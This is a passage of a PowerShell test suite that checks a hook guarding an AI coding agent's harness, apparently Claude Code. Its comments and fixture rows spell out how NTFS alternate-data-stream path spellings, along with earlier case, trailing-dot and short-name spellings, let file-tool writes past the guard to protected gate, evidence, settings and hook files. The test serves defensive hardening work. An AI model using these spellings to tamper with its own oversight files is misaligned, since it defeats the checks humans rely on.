        [void]$h26Lines.Add(('    (L) {0} is NOT TRACKED at HEAD -- ABSENT: the operator''s step (amendment 55) has not landed here; nothing to read. Under this checkout''s rules it is {1}.' -f $h26Rel, $(if ($ci.code -eq 0) { 'IGNORED' } elseif ($ci.code -eq 1) { 'NOT ignored' } else { 'UNDETERMINED' })))
    } else {
        $blob = Invoke-Wp1H18Git -Dir $repoRoot -GitArgs @('cat-file', '-p', ('HEAD:' + $h26Rel))
        $liveText = ([string]$blob.out) -replace "`r`n", "`n"
        $lr = Test-Wp1H26Registration -Text $liveText
        $eq = ($liveText.TrimEnd("`n") -ceq $h26PropText.TrimEnd("`n"))
        $ci1 = Invoke-Wp1H18Git -Dir $repoRoot -GitArgs @('check-ignore', '-q', '--no-index', ($h26Cl + '/settings.local.json'))
        $ci2 = Invoke-Wp1H18Git -Dir $repoRoot -GitArgs @('check-ignore', '-q', '--no-index', ($h26Cl + '/worktrees/x'))
        $ignOk = ($ci1.code -eq 0) -and ($ci2.code -eq 0)
        if (-not (($blob.code -eq 0) -and $lr.ok -and $eq -and $ignOk)) { $h26Ok = $false }
        [void]$h26Lines.Add(('    (L) {0} IS TRACKED at HEAD: reader {1}{2}; equal to the proposal (LF basis): {3}; settings.local.json and worktrees/ still ignored: {4}' -f $h26Rel, $(if ($lr.ok) { 'PASS' } else { 'REFUSES' }), $(if (-not $lr.ok) { ' -- ' + (@($lr.findings) -join '; ') } else { '' }), $eq, $ignOk))
    }
} catch {
    $h26Ok = $false
    [void]$h26Lines.Add(("    H-26 THREW at script line {0}: {1} -- the ABSENCE of a measurement, not a pass" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
}
$h26detail = @"
  THE TRACKED REGISTRATION RULING (v) ASKS FOR, READ WHEN PRESENT -- and until then, the exact proposal the
  operator lands (amendment 55), pinned to the tracked fragment it is derived from.
$($h26Lines -join "`n")
  WHAT A RED ROW MEANS. (P) red: the proposal is missing, fails the reader, or no longer equals this member's
  restatement of the installer's composition of the tracked fragment plus one line -- re-derive it before the
  operator lands it. (R) red: the
  reader passed a defect or refused the proposal. (L) red: a TRACKED registration exists and is not the
  proposal, fails the reader, or a still-local file has become un-ignored.
  WHAT IS NOT CLAIMED: that autoMemoryEnabled false is HONOURED by the harness -- WP-E's live probes measured
  that (amendment 55) and this member runs no session; nor anything about the untracked root file, which it
  never opens.
"@
Check -Id 'H-26' -Title 'the tracked hook registration is read when present -- autoMemoryEnabled the boolean false and the four next-gen hooks -- and until then the exact proposal is pinned to the tracked fragment it is derived from (ruling (v))' `
      -Ok $h26Ok -Detail $h26detail
# =============================================================================================
# H-27 -- THE NTFS STREAM SPELLING AGAINST T-3 AND A1'S PROTECTED TIER, FILE-TOOL ROUTE, FROM A
#         ROOT SEAT: A WRITE WHOSE TARGET CARRIES A STREAM SUFFIX ON AN INTERIOR COMPONENT IS
#         REFUSED; THE PLAIN CONTROL IS REFUSED AS TODAY; A STREAM OUTSIDE PROTECTED PATHS AND
#         EVERY READ ARE NOT (WP-E2, E2-1; a path-normalization spelling class,
#         an earlier fix's precedent)
# =============================================================================================
# THE CLASS. A component boundary in the guard's literal patterns is a slash. The filesystem gives
# every file object a second boundary the patterns do not read: a COLON opens an NTFS alternate data
# stream of the SAME object. `.mission::$INDEX_ALLOCATION/gates/x.yaml` writes the directory index
# stream of `.mission` and then a path continues, and every string comparison sees a first component
# `.mission::$INDEX_ALLOCATION` that the two-component literals `.mission/gates`, `.mission/evidence`,
# `.mission-runtime/evidence`, `.claude/settings.json` and `tools/framework/hooks` no longer match.
# MEASURED at the base from a ROOT seat (a git-init main checkout, .git a DIRECTORY, so the amendment
# 55 seat tripwire returns 'main' and is silent -- the T-3 gate rule and A1's protected tier are then
# the only defence): a file-tool Write to each stream spelling was ALLOWED while the plain spelling of
# each was DENIED. This is the same class as case (round 3), the trailing dot (round 8), the 8.3 alias
# (round 9) and the extended-length prefix (round 10): the guard compares path STRINGS while the
# filesystem resolves several spellings onto one object. The cure is theirs -- ADD the stream-stripped
# form to what the guard normalizes BEFORE the gate rule and the protected tier, deny-side, never
# substituted.
# WHY FILE-TOOL ONLY. The shell route is already closed and this member records why rather than
# re-driving it: every real ADS name carries a `$` ($DATA, $INDEX_ALLOCATION), which is a shell
# metacharacter, so A1's metacharacter+parent tier refuses `cp .mission::$DATA/evidence/x` and
# `git add .mission::$INDEX_ALLOCATION/gates/x` for every role at the base already. A file tool carries
# a clean path with no shell tier above it, so the file-tool route is the one with no defence.
# THE ROOT SEAT IS THE ROLE THAT REACHES THE GAP. From a linked seat the seat tripwire denies
# the whole `.mission` component regardless of a stream (H-28), so the gap is reachable for the T-3 and
# protected tiers only where the tripwire is silent -- the root seat, and every role there.
$h27Ok = $true
$h27Bad = 0
$h27DenyWant = 0; $h27DenyOk = 0; $h27AllowWant = 0; $h27AllowOk = 0
$h27Lines = New-Object System.Collections.Generic.List[string]
$h27Pred  = New-Object System.Collections.Generic.List[string]
$h27F0 = [ordered]@{}
$h27FixtureOk = $false
$h27PredOk = $false
$h27Reached = $false
$h27Base = ''
$h27SavedProj = $env:CLAUDE_PROJECT_DIR
$h27SavedCeil = $env:GIT_CEILING_DIRECTORIES
$h27SavedMdi  = $env:MISSION_DISPATCH_ID
$a2 = '::$' + 'INDEX_ALLOCATION'   # the directory index stream
$aD = '::$' + 'DATA'              # the default data stream
$aN = ':strm:$' + 'DATA'          # a named stream
$m27  = '.mission'
$mr27 = '.mission' + '-runtime'
$cl27 = '.cl' + 'aude'
$tf27 = 'tools/framework'
try {
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    $env:MISSION_DISPATCH_ID = 'session-wp1-h27'
    $h27Base = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h27-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
    $null = New-Item -ItemType Directory -Force -Path $h27Base | Out-Null
    $env:GIT_CEILING_DIRECTORIES = $h27Base
    $h27Main = Join-Path $h27Base 'main'
    $enc27 = New-Object System.Text.UTF8Encoding($false)
    $gi = Invoke-Wp1H18Git -Dir $h27Base -GitArgs @('init', '-q', 'main')
    $h27F0['M: git init succeeded'] = ($gi.code -eq 0)
    $h27F0['M: its .git entry is a DIRECTORY (a root seat -- the tripwire is silent)'] = [System.IO.Directory]::Exists((Join-Path $h27Main '.git'))
    if ($h27F0['M: its .git entry is a DIRECTORY (a root seat -- the tripwire is silent)']) {
        [System.IO.File]::WriteAllText((Join-Path $h27Main 'seed.txt'), "seed`n", $enc27)
        $null = Invoke-Wp1H18Git -Dir $h27Main -GitArgs @('add', 'seed.txt')
        $gc = Invoke-Wp1H18Git -Dir $h27Main -GitArgs @('commit', '-q', '-m', 'seed')
        $h27F0['M: one commit'] = ($gc.code -eq 0)
    }
    $h27F0['the fixture lies outside the repository under test'] = -not ($h27Base.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase))
    $h27FixtureOk = (@($h27F0.Values | Where-Object { -not $_ }).Count -eq 0)

    function Invoke-H27Row {
        param($Row)
        $env:CLAUDE_PROJECT_DIR = $h27Main
        Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
        try {
            $payload = @{ session_id = 'session-wp1-h27'; hook_event_name = 'PreToolUse'; tool_name = $Row.tool
                          tool_input = $Row.ti; cwd = $Row.cwd } | ConvertTo-Json -Depth 8 -Compress
            $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
        } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
        $gotDeny  = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
        $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
        $trip     = ($res.stdout -like '*SEAT TRIPWIRE*')
        $t3       = ($res.stdout -like '*under .mission/gates*') -or ($res.stdout -like '*references .mission/gates*')
        $prot     = ($res.stdout -like '*protected path*')
        return [pscustomobject]@{ deny = $gotDeny; allow = $gotAllow; trip = $trip; t3 = $t3; prot = $prot; exit = $res.exit; out = $res.stdout }
    }
    function New-H27Row {
        param([string]$Id, [string]$Tool, $Ti, [string]$Cwd, [string]$Want, [string]$Rule, [string]$Why)
        return [pscustomobject]@{ id = $Id; tool = $Tool; ti = $Ti; cwd = $Cwd; want = $Want; rule = $Rule; why = $Why }
    }
    $rows27 = @()
    if ($h27FixtureOk) {
        # DENY, want -- a stream on an INTERIOR component under a gate or a protected path. RED at base.
        $rows27 += New-H27Row 'G1' 'Write' @{ file_path = (Join-Path $h27Main ($m27 + $a2 + '\gates\push-x.yaml')); content = 'x' } $h27Main 'deny' 't3' 'the index stream on .mission, then /gates/'
        $rows27 += New-H27Row 'G2' 'Write' @{ file_path = (Join-Path $h27Main ($m27 + $aD + '\gates\push-x.yaml')); content = 'x' } $h27Main 'deny' 't3' 'the default data stream ::$DATA'
        $rows27 += New-H27Row 'G3' 'Write' @{ file_path = (Join-Path $h27Main ($m27 + $aN + '\gates\push-x.yaml')); content = 'x' } $h27Main 'deny' 't3' 'a NAMED stream :strm:$DATA'
        $rows27 += New-H27Row 'G4' 'Write' @{ file_path = (Join-Path $h27Main ('.MISSION' + $a2 + '\Gates\push-x.yaml')); content = 'x' } $h27Main 'deny' 't3' 'CASE plus the stream (one file, one bypass)'
        $rows27 += New-H27Row 'G5' 'Edit'  @{ file_path = ($m27 + $a2 + '/gates/push-x.yaml'); old_string = 'a'; new_string = 'b' } $h27Main 'deny' 't3' 'a RELATIVE stream path, joined to the payload cwd'
        $rows27 += New-H27Row 'G6' 'MultiEdit' @{ file_path = (Join-Path $h27Main ($m27 + $a2 + '\gates\push-x.yaml')); edits = @(@{ old_string = 'a'; new_string = 'b' }) } $h27Main 'deny' 't3' 'MultiEdit, the stream on the top-level path'
        $rows27 += New-H27Row 'G7' 'FileWrite' @{ file_path = (Join-Path $h27Main ($m27 + $a2 + '\gates\push-x.yaml')); content = 'x' } $h27Main 'deny' 't3' 'an UNKNOWN write-tool name (the file-tool branch is an inverted allow-list)'
        $rows27 += New-H27Row 'G8' 'MultiEdit' @{ edits = @(@{ file_path = (Join-Path $h27Main ($m27 + $aD + '\gates\y.yaml')); old_string = 'a'; new_string = 'b' }) } $h27Main 'deny' 't3' 'the stream path NESTED under edits[] (the depth walk)'
        $rows27 += New-H27Row 'P1' 'Write' @{ file_path = (Join-Path $h27Main ($m27 + $a2 + '\evidence\d\log.jsonl')); content = 'x' } $h27Main 'deny' 'prot' 'the committed evidence plane .mission/evidence'
        $rows27 += New-H27Row 'P2' 'Write' @{ file_path = (Join-Path $h27Main ($mr27 + $a2 + '\evidence\d\log.jsonl')); content = 'x' } $h27Main 'deny' 'prot' 'the runtime evidence plane .mission-runtime/evidence'
        $rows27 += New-H27Row 'P3' 'Write' @{ file_path = (Join-Path $h27Main ($cl27 + $a2 + '\settings.json')); content = 'x' } $h27Main 'deny' 'prot' 'the tracked hook registration .claude/settings.json'
        $rows27 += New-H27Row 'P4' 'Write' @{ file_path = (Join-Path $h27Main ($tf27 + $aD + '/hooks/lib/x.ps1')); content = 'x' } $h27Main 'deny' 'prot' 'the sealed guard machinery tools/framework/hooks'
        $rows27 += New-H27Row 'P5' 'NotebookEdit' @{ notebook_path = (Join-Path $h27Main ($m27 + $a2 + '\evidence\d\n.ipynb')); new_source = 'x' } $h27Main 'deny' 'prot' 'NotebookEdit into the evidence plane through the stream'
        # ALLOW, want -- the tripwire NARROWS: outside protected, a non-.mission sibling, a parent-only
        # path, a different .claude file, and every read stay allowed. Green at base and tip.
        $rows27 += New-H27Row 'A1' 'Write' @{ file_path = (Join-Path $h27Main ('src\x.py' + $aD)); content = 'x' } $h27Main 'allow' 'none' 'a stream OUTSIDE any protected path'
        $rows27 += New-H27Row 'A2' 'Write' @{ file_path = (Join-Path $h27Main ('.missionx' + $aD + '\y.txt')); content = 'x' } $h27Main 'allow' 'none' '.missionx is not .mission -- the strip must not widen the component'
        $rows27 += New-H27Row 'A3' 'Write' @{ file_path = (Join-Path $h27Main ($mr27 + $aD + '\other\x.txt')); content = 'x' } $h27Main 'allow' 'none' '.mission-runtime/other is a PARENT-only path, not under /evidence'
        $rows27 += New-H27Row 'A4' 'Write' @{ file_path = (Join-Path $h27Main ($cl27 + $aD + '\settings.local.json')); content = 'x' } $h27Main 'allow' 'none' '.claude/settings.local.json is not the protected settings.json'
        $rows27 += New-H27Row 'A5' 'Write' @{ file_path = (Join-Path $h27Main 'docs\notes.md'); content = 'x' } $h27Main 'allow' 'none' 'a plain path with no stream at all'
        $rows27 += New-H27Row 'A6' 'Read'  @{ file_path = (Join-Path $h27Main ($m27 + $a2 + '\gates\push-x.yaml')) } $h27Main 'allow' 'none' 'a READ of a gate through the stream (reads are never refused)'
        $rows27 += New-H27Row 'A7' 'Grep'  @{ pattern = 'x'; path = (Join-Path $h27Main ($m27 + $a2 + '\evidence')) } $h27Main 'allow' 'none' 'a Grep of the evidence plane through the stream'
        $rows27 += New-H27Row 'A8' 'Glob'  @{ pattern = '*'; path = (Join-Path $h27Main ($mr27 + $a2 + '\evidence')) } $h27Main 'allow' 'none' 'a Glob of the runtime plane through the stream'
    }
    foreach ($r in $rows27) {
        $v = Invoke-H27Row -Row $r
        $ok = $false
        if ($r.want -eq 'deny') {
            $h27DenyWant++
            # NEVER the seat tripwire (this is a root seat) -- the deny must be the NAMED tier's.
            $attributed = switch ($r.rule) {
                't3'   { $v.t3 -and (-not $v.trip) }
                'prot' { $v.prot -and (-not $v.trip) }
                default { $true }
            }
            $ok = $v.deny -and $attributed
            if ($ok) { $h27DenyOk++ }
        } else {
            $h27AllowWant++
            $ok = $v.allow -and (-not $v.trip)
            if ($ok) { $h27AllowOk++ }
        }
        if (-not $ok) { $h27Bad++ }
        $shown = if ($r.ti.Contains('file_path')) { '[' + $r.tool + '] ' + [string]$r.ti['file_path'] } elseif ($r.ti.Contains('notebook_path')) { '[' + $r.tool + '] ' + [string]$r.ti['notebook_path'] } elseif ($r.ti.Contains('path')) { '[' + $r.tool + '] ' + [string]$r.ti['path'] } else { '[' + $r.tool + '] (nested edits[].file_path)' }
        if ($h27Base) { $shown = $shown.Replace($h27Base, '<base>') }
        [void]$h27Lines.Add(('      {0,-4} want={1,-5} rule={2,-4} exit={3} {4} {5}' -f $r.id, $r.want.ToUpperInvariant(), $r.rule, $v.exit, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
        $said = (([string]$v.out) -replace '\s+', ' ')
        [void]$h27Lines.Add('           ' + $r.why + $(if (-not $ok) { '  ||  said: ' + $said.Substring(0, [Math]::Min(240, $said.Length)) } else { '' }))
    }
    # THE NORMALIZER, ASKED DIRECTLY. Absent from a library without the cure: that is RED, not a crash.
    $h27HasStrip = [bool](Get-Command -Name 'Remove-EvidenceStreamSuffix' -CommandType Function -ErrorAction SilentlyContinue)
    $h27PredOk = $h27HasStrip
    if (-not $h27HasStrip) { [void]$h27Pred.Add('      Remove-EvidenceStreamSuffix : ABSENT from the library under test') }
    else {
        $stripCases = @(
            @(($m27 + $a2 + '/gates/x'), ($m27 + '/gates/x')),
            @(($m27 + $aD), $m27),
            @(($cl27 + $a2 + '/settings.json'), ($cl27 + '/settings.json')),
            @('foo/bar', ''),                         # no colon: adds nothing
            @(('C:/r/' + $m27 + $aD + '/x'), ('C:/r/' + $m27 + '/x')),   # a drive letter is kept
            @(('C:' + $m27 + $aD + '/x'), ('C:' + $m27 + '/x')),         # drive-relative kept
            @((':' + $m27 + '/x'), ''),               # a LEADING colon is not a stream: left to the tripwire
            @('x/y.txt:s:$DATA', 'x/y.txt')           # a stream on the last component
        )
        foreach ($c in $stripCases) {
            $got = ''
            try { $r = Remove-EvidenceStreamSuffix -Path $c[0]; $got = if ($null -eq $r) { '' } else { [string]$r } } catch { $got = 'THREW' }
            $cOk = ($got -eq $c[1]); if (-not $cOk) { $h27PredOk = $false }
            [void]$h27Pred.Add(('      strip {0,-34} -> {1,-24} (expect {2,-24}) {3}' -f ("'" + $c[0] + "'"), ("'" + $got + "'"), ("'" + $c[1] + "'"), $(if ($cOk) { 'ok' } else { 'WRONG' })))
        }
    }
    $h27Reached = $h27FixtureOk -and ($h27DenyWant -eq 13) -and ($h27AllowWant -eq 8)
    if (-not $h27FixtureOk -or ($h27Bad -gt 0) -or -not $h27Reached -or -not $h27PredOk) { $h27Ok = $false }
} catch {
    $h27Ok = $false
    [void]$h27Lines.Add(("      H-27 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
} finally {
    if ($null -ne $h27SavedProj) { $env:CLAUDE_PROJECT_DIR = $h27SavedProj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
    if ($null -ne $h27SavedCeil) { $env:GIT_CEILING_DIRECTORIES = $h27SavedCeil } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    if ($null -ne $h27SavedMdi) { $env:MISSION_DISPATCH_ID = $h27SavedMdi } else { Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    if ($h27Base -and (Test-Path -LiteralPath $h27Base)) {
        try { Remove-Item -LiteralPath $h27Base -Recurse -Force -ErrorAction Stop } catch { }
    }
}
$h27F0Lines = @($h27F0.Keys | ForEach-Object { ('      [{0}] {1}' -f $(if ($h27F0[$_]) { 'ok' } else { 'NO' }), $_) })
$h27detail = @"
  ONE QUESTION -- does the REAL hook refuse a FILE-TOOL write whose target carries an NTFS stream suffix
  on an interior component under a gate or a protected path, from a ROOT seat where the amendment 55
  tripwire is silent, and refuse nothing outside that? The stripped form is added to what the guard
  normalizes before the gate rule and the protected tier, deny-side, never substituted.
    F-0, the fixture's own shape (a git-init main checkout, its .git a directory):
$($h27F0Lines -join "`n")
      deny rows denied, each by its NAMED tier (t3 / prot, never trip) : $h27DenyOk of $h27DenyWant
      allow rows allowed                                                : $h27AllowOk of $h27AllowWant
      divergences                                                        : $h27Bad   (expect 0)
      table reached                                                      : $h27Reached   (expect True -- 13 deny, 8 allow)
$($h27Lines -join "`n")
    THE NORMALIZER, ASKED DIRECTLY: $h27PredOk   (expect True)
$($h27Pred -join "`n")
  WHAT A RED ROW MEANS. A DENY row that ALLOWS is the finding: a stream spelling reaches a gate or a
  protected path past the file-tool tier. A DENY row that carries the SEAT TRIPWIRE sentence means the
  wrong rule refused it (this is a root seat; the tripwire must be silent). An ALLOW row that DENIES
  means the strip widened past the stream class -- .missionx, a parent-only path, a different .claude
  file, or a read. ABSENT normalizer is the RED of a library before the cure.
  WHAT IS NOT CLAIMED: a boundary. The SHELL route is not re-driven -- every ADS name carries
  a `$`, so A1's metacharacter+parent tier already refuses cp/git add stream forms for every role. That
  a live root seat is guarded at all is A1's protected tier and T-3; this member closes the spelling by
  which they were read past.
"@
Check -Id 'H-27' -Title 'the NTFS stream spelling against T-3 and A1''s protected tier, file-tool route, from a root seat: a Write/Edit/MultiEdit/NotebookEdit (unknown tool names and nested paths included) whose target carries a stream suffix on an interior component under a gate or a protected path is REFUSED, deny-side; the plain control is refused as today, and a stream outside protected paths, a non-.mission sibling, a parent-only path, a different .claude file and every read are not (WP-E2, E2-1; amendment 57)' `
      -Ok $h27Ok -Detail $h27detail

# =============================================================================================
# H-28 -- THE SAME SPELLING AGAINST THE SEAT TRIPWIRE, FROM A LINKED SEAT: A STREAM-
#         SPELLED MISSION-PLANE WRITE IS REFUSED (CONTROL: GREEN AT THE BASE AND AT THE TIP -- THE
#         TRIPWIRE ALREADY READS A COLON AS A COMPONENT BOUNDARY; E2-1's CURE DOES NOT PERTURB IT)
#         (WP-E2, E2-2)
# =============================================================================================
# WHY THIS IS A CONTROL, NOT A RED-FIRST MEMBER. The seat tripwire's cure built its territory test
# (Get-EvidenceMissionPlanePathClass) to read a colon OR a slash as a component boundary -- its own
# review round 1's findings drove the NTFS stream and the git colon pathspec. So from a LINKED
# seat the stream class was already closed when the tripwire shipped, and this member is GREEN at the
# base (before E2-1's cure) AS WELL AS at the tip. Its job is twofold: to record that the seat route
# and the T-3/protected route DIVERGED on this class -- the tripwire anticipated the stream, the two
# literal tiers did not, and E2-1 brings them into line -- and to prove E2-1's cure (a file-tool
# candidate strip and an A1 protected-tier offer) leaves the seat tripwire's verdicts unmoved. It CAN
# go red: remove the colon from the tripwire's boundary and W-lad below allows.
$h28Ok = $true
$h28Bad = 0
$h28DenyWant = 0; $h28DenyOk = 0; $h28AllowWant = 0; $h28AllowOk = 0
$h28Lines = New-Object System.Collections.Generic.List[string]
$h28Pred  = New-Object System.Collections.Generic.List[string]
$h28F0 = [ordered]@{}
$h28FixtureOk = $false
$h28PredOk = $false
$h28Reached = $false
$h28Base = ''
$h28SavedProj = $env:CLAUDE_PROJECT_DIR
$h28SavedCeil = $env:GIT_CEILING_DIRECTORIES
$h28SavedWt   = $env:LAM_WORKTREE
$h28SavedMdi  = $env:MISSION_DISPATCH_ID
try {
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
    $env:MISSION_DISPATCH_ID = 'session-wp1-h28'
    $h28Base = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h28-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
    $null = New-Item -ItemType Directory -Force -Path $h28Base | Out-Null
    $env:GIT_CEILING_DIRECTORIES = $h28Base
    $h28Main = Join-Path $h28Base 'main'
    $h28Wt = Join-Path $h28Base 'main-worktrees\wt-D-E2W'
    $enc28 = New-Object System.Text.UTF8Encoding($false)
    $gi = Invoke-Wp1H18Git -Dir $h28Base -GitArgs @('init', '-q', 'main')
    $h28F0['M: git init succeeded'] = ($gi.code -eq 0)
    $h28F0['M: its git dir lies inside M'] = (Test-Wp1H18GitDirInside -Dir $h28Main -Inside $h28Main)
    if ($h28F0['M: its git dir lies inside M']) {
        [System.IO.File]::WriteAllText((Join-Path $h28Main 'seed.txt'), "seed`n", $enc28)
        $null = Invoke-Wp1H18Git -Dir $h28Main -GitArgs @('add', 'seed.txt')
        $gc = Invoke-Wp1H18Git -Dir $h28Main -GitArgs @('commit', '-q', '-m', 'seed')
        $h28F0['M: one commit'] = ($gc.code -eq 0)
        $gw = Invoke-Wp1H18Git -Dir $h28Main -GitArgs @('worktree', 'add', '-q', '--detach', $h28Wt, 'HEAD')
        $h28F0['W: git worktree add succeeded'] = ($gw.code -eq 0)
        $h28F0['W: its .git is a FILE (a linked seat)'] = [System.IO.File]::Exists((Join-Path $h28Wt '.git'))
        $h28F0['W: its git dir lies inside M\.git'] = (Test-Wp1H18GitDirInside -Dir $h28Wt -Inside (Join-Path $h28Main '.git'))
    }
    $h28F0['the fixture lies outside the repository under test'] = -not ($h28Base.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase))
    $h28FixtureOk = (@($h28F0.Values | Where-Object { -not $_ }).Count -eq 0)

    function Invoke-H28Row {
        param($Row)
        if ($Row.proj) { $env:CLAUDE_PROJECT_DIR = $Row.proj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
        Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
        Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
        try {
            $payload = @{ session_id = 'session-wp1-h28'; hook_event_name = 'PreToolUse'; tool_name = $Row.tool
                          tool_input = $Row.ti; cwd = $Row.cwd } | ConvertTo-Json -Depth 8 -Compress
            $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
        } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
        $gotDeny  = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
        $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
        $trip     = ($res.stdout -like '*SEAT TRIPWIRE*')
        return [pscustomobject]@{ deny = $gotDeny; allow = $gotAllow; trip = $trip; exit = $res.exit; out = $res.stdout }
    }
    $m28  = '.mission'
    $mr28 = '.mission' + '-runtime'
    $a2b  = '::$' + 'INDEX_ALLOCATION'
    $aDb  = '::$' + 'DATA'
    $rows28 = @()
    if ($h28FixtureOk) {
        # DENY by the SEAT TRIPWIRE, from the linked seat W. Green at base and tip.
        $rows28 += @{ id = 'W-lad'; proj = $h28Wt; tool = 'Write'; ti = @{ file_path = (Join-Path $h28Wt ($m28 + $a2b + '\ledger\entries.jsonl')); content = 'x' }; cwd = $h28Wt; want = 'deny'; why = 'the index stream on .mission, from the linked seat' }
        $rows28 += @{ id = 'W-lam'; proj = $h28Wt; tool = 'Write'; ti = @{ file_path = (Join-Path $h28Wt ($mr28 + $a2b + '\lam\helpers\h.py')); content = 'x' }; cwd = $h28Wt; want = 'deny'; why = 'the stream on .mission-runtime, then /lam' }
        $rows28 += @{ id = 'W-git'; proj = $h28Wt; tool = 'Write'; ti = @{ file_path = (Join-Path $h28Wt ('.git' + $aDb)); content = 'gitdir: x' }; cwd = $h28Wt; want = 'deny'; why = 'the session''s own .git entry through the stream' }
        $rows28 += @{ id = 'W-nst'; proj = $h28Wt; tool = 'MultiEdit'; ti = @{ edits = @(@{ file_path = (Join-Path $h28Wt ($m28 + $aDb + '\amendments\A.yaml')); old_string = 'a'; new_string = 'b' }) }; cwd = $h28Wt; want = 'deny'; why = 'the stream path NESTED under edits[]' }
        $rows28 += @{ id = 'W-nbk'; proj = $h28Wt; tool = 'NotebookEdit'; ti = @{ notebook_path = (Join-Path $h28Wt ($mr28 + $a2b + '\lam\n.ipynb')); new_source = 'x' }; cwd = $h28Wt; want = 'deny'; why = 'NotebookEdit into .mission-runtime/lam through the stream' }
        # ALLOW -- outside the plane, and a read. Green at base and tip.
        $rows28 += @{ id = 'W-out'; proj = $h28Wt; tool = 'Write'; ti = @{ file_path = (Join-Path $h28Wt ('src\x.py' + $aDb)); content = 'x' }; cwd = $h28Wt; want = 'allow'; why = 'a stream OUTSIDE the plane, from the linked seat' }
        $rows28 += @{ id = 'W-rd';  proj = $h28Wt; tool = 'Read';  ti = @{ file_path = (Join-Path $h28Wt ($m28 + $a2b + '\ledger\entries.jsonl')) }; cwd = $h28Wt; want = 'allow'; why = 'a READ of the plane through the stream' }
        # ROOT control -- the SAME write from the root seat M. ALLOW: the tripwire is silent, and
        # .mission/ledger is neither a gate nor a protected path, so no rule fires. This is what proves
        # the seat tripwire, not T-3 or the protected tier, is what denies W-lad.
        $rows28 += @{ id = 'R-led'; proj = $h28Main; tool = 'Write'; ti = @{ file_path = (Join-Path $h28Main ($m28 + $a2b + '\ledger\entries.jsonl')); content = 'x' }; cwd = $h28Main; want = 'allow'; why = 'the same stream write from the ROOT seat: no rule fires' }
    }
    foreach ($r in $rows28) {
        $v = Invoke-H28Row -Row $r
        $ok = $false
        if ($r.want -eq 'deny') {
            $h28DenyWant++
            $ok = $v.deny -and $v.trip     # it MUST be the seat tripwire's sentence
            if ($ok) { $h28DenyOk++ }
        } else {
            $h28AllowWant++
            $ok = $v.allow -and (-not $v.trip)
            if ($ok) { $h28AllowOk++ }
        }
        if (-not $ok) { $h28Bad++ }
        $shown = if ($r.ti.Contains('file_path')) { '[' + $r.tool + '] ' + [string]$r.ti['file_path'] } elseif ($r.ti.Contains('notebook_path')) { '[' + $r.tool + '] ' + [string]$r.ti['notebook_path'] } else { '[' + $r.tool + '] (nested edits[].file_path)' }
        if ($h28Base) { $shown = $shown.Replace($h28Base, '<base>') }
        [void]$h28Lines.Add(('      {0,-6} want={1,-5} trip={2,-5} exit={3} {4} {5}' -f $r.id, $r.want.ToUpperInvariant(), $v.trip, $v.exit, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
        [void]$h28Lines.Add('           ' + $r.why + $(if (-not $ok) { '  ||  said: ' + ((([string]$v.out) -replace '\s+', ' ').Substring(0, [Math]::Min(220, ([string]$v.out).Length))) } else { '' }))
    }
    # THE TERRITORY TEST, ASKED DIRECTLY over stream spellings -- the predicate the seat tripwire's cure built.
    $h28HasClass = [bool](Get-Command -Name 'Get-EvidenceMissionPlanePathClass' -CommandType Function -ErrorAction SilentlyContinue)
    $h28PredOk = $h28HasClass
    if (-not $h28HasClass) { [void]$h28Pred.Add('      Get-EvidenceMissionPlanePathClass : ABSENT') }
    else {
        $cc = @(
            @(($m28 + $a2b + '/gates/x'), '', 'mission'),
            @(('C:/r/' + $m28 + $a2b + '/x'), '', 'mission'),
            @(($mr28 + $a2b + '/lam/x'), '', 'lam'),
            @(('C:/r/.git' + $aDb), 'C:/r', 'dotgit'),
            @(('.missionx' + $aDb + '/y'), '', ''),
            @(('src/x.py' + $aDb), '', '')
        )
        foreach ($c in $cc) {
            $got = ''
            try { $got = [string](Get-EvidenceMissionPlanePathClass -Path $c[0] -Roots @($c[1])) } catch { $got = 'THREW' }
            $cOk = ($got -eq $c[2]); if (-not $cOk) { $h28PredOk = $false }
            [void]$h28Pred.Add(('      class {0,-40} root {1,-6} -> {2,-8} (expect {3,-8}) {4}' -f ("'" + $c[0] + "'"), ("'" + $c[1] + "'"), ("'" + $got + "'"), ("'" + $c[2] + "'"), $(if ($cOk) { 'ok' } else { 'WRONG' })))
        }
    }
    $h28Reached = $h28FixtureOk -and ($h28DenyWant -eq 5) -and ($h28AllowWant -eq 3)
    if (-not $h28FixtureOk -or ($h28Bad -gt 0) -or -not $h28Reached -or -not $h28PredOk) { $h28Ok = $false }
} catch {
    $h28Ok = $false
    [void]$h28Lines.Add(("      H-28 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
} finally {
